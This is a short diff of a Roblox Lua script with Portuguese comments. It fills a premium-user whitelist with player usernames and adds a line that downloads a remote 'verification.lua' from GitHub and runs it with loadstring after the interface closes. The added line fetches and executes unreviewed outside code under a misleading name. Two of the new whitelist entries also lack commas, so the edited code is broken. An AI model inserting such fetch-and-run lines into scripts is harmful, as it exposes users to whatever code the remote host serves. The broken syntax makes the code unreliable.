@@ -1,12 +1,12 @@
 local player = game:GetService("Players").LocalPlayer
 
--- Atenção, aqui abaixo é onde deve adicionar os players.
-
 local premiumUsers = {
     ["JumexD24"] = true,
-    ["PremiumUser1"] = true,
-    ["PremiumUser2"] = true,
-    ["NovoPremium"] = true
+    ["Kaua_452"] = true,
+    ["pedro312jee"] = true,
+    ["xes_jsok"] = true
+    ["Itz_Mariena"] = true
+    ["thiagojuniorgamer12"] = true
 }
 
 local function isAllowed(name)
@@ -48,6 +48,7 @@ local function executarPremium()
     frame.BackgroundColor3 = Color3.fromRGB(10, 60, 20)
     wait(1.5)
     gui:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/anonymous5729/freeman-scripting/main/verification.lua"))()
 end
 
 coroutine.wrap(function()
